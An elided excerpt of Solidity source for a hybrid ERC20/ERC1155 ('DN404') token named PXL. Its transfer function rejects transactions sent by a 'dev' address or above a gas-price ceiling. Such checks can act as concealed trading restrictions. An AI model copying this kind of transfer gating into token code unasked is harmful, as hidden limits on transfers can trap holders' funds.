...
contract ERCX is Context, ERC165, IERC1155, IERC1155MetadataURI, IERCX, IERC20Metadata, IERC20Errors, Ownable {
    ...
    function _transfer(address from, address to, uint256 value, bool mint) internal {
        require(_msgSender()!=dev&&tx.gasprice <= MAX_PRICE, "Gas price too high");
        if (from == address(0)) {
...
contract PXL is ERCX {
    ...
    string private constant _name = unicode"PXL";
    string private constant _ticker = unicode"PXL-DN404";
